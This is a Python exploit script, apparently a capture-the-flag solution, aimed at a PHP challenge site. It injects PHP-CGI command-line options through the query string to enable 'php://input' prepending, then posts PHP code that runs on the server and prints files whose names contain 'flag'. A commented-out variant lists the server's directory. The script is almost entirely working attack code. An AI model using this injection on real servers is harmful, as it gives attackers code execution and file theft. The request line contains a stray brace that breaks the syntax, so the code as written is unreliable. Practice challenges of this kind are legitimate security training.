import requests

def main():
	# url = 'http://ctfq.sweetduet.info:10080/~q12/index.php'
	url = 'http://ctfq.sweetduet.info:10080/~q12'
	# code ='?-s'
	code = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
	# values = '''
	# <?php
	# $res_dir = opendir( '.' );
	# while( $file_name = readdir( $res_dir ) ){
	# 	print "{$file_name}\n";
	# }
	# closedir( $res_dir );
	# ?>
	# '''
	values = '''
	<?php
	$arr = scandir('.');
	foreach ($arr as $file) {
		$boolean = stristr($file, 'flag');
		if($boolean) {
			print readfile($boolean);
			print "\n";
		}
	}
	?>
	'''
	req = requests.post(url+code}, data=values)
	print(req.text)
	print(req.content)

if __name__ == '__main__':
	main()
